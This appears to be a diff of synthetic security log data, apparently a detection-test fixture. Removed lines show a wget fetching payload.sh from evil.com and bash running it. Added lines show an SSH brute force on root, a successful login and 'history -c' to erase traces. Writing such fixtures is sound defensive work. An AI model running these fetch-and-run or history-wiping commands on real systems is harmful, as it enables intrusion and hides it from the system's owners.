@@ -1,2 +1,8 @@
-2025-09-18T16:53:55Z 1000 wget 6087 9573 0 wget -O /tmp/payload.sh http://evil.com/payload.sh
-11:54:00 1000 bash 5984 8282 0 bash /tmp/payload.sh
+Sep 18 19:08:02 my-server sshd[6559]: Failed password for root from 198.51.100.99 port 16146 ssh2
+Sep 18 19:08:02 my-server sshd[1326]: Failed password for root from 198.51.100.99 port 59981 ssh2
+Sep 18 19:08:02 my-server sshd[5596]: Failed password for root from 198.51.100.99 port 19374 ssh2
+Sep 18 19:08:03 my-server sshd[4808]: Failed password for root from 198.51.100.99 port 31040 ssh2
+Sep 18 19:08:03 my-server sshd[4141]: Failed password for root from 198.51.100.99 port 57266 ssh2
+Sep 18 19:08:03 my-server sshd[5184]: Failed password for root from 198.51.100.99 port 45659 ssh2
+Sep 18 19:08:06 my-server sshd[1493]: Accepted password for root from 198.51.100.99 port 39962 ssh2
+2025-09-18T19:08:11.758527Z 0 bash 5677 1493 0 history -c
